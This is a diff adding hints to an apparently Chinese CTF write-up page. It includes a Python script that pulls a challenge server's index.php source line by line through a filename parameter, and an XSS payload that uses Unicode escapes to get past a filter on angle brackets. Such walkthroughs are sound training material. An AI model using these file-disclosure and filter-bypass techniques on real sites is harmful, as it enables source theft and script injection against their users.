@@ -363,6 +363,41 @@ clicks=1000001
 
 <h2 id="25cookies欺骗">25.cookies欺骗</h2>
 
+<p><strong>tips:</strong></p>
+
+<p>1.获取 <code class="highlighter-rouge">index.php</code> 文件的源码</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#encoding:utf-8</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"http://120.24.86.145:8002/web11/index.php?line={0}&amp;filename=aW5kZXgucGhw"</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+
+<span class="n">ans</span> <span class="o">=</span> <span class="s">""</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
+	<span class="n">response</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+	<span class="n">ans</span> <span class="o">+=</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>2.分析源码，构造 cookie 即可</p>
+
+<p>##26.XSS</p>
+
+<p><strong>tips:</strong></p>
+
+<p><code class="highlighter-rouge">&lt; &gt;</code>被过滤了，使用Unicode编码绕过<a href="http://www.360doc.com/content/16/0308/12/2340477_540447147.shtml">查看原理</a></p>
+
+<p>用<code class="highlighter-rouge">\u003c</code>和<code class="highlighter-rouge">\u003e</code>来代替<code class="highlighter-rouge">&lt;</code> <code class="highlighter-rouge">&gt;</code></p>
+
+<p><strong>payload：</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>id=\u003cscript\u003ealert(__key__)\u003c/script\u0003e
+</code></pre></div></div>
+
+<h2 id="27never-give-up">27.never give up</h2>
+
 
     </article>
     <div class="share">
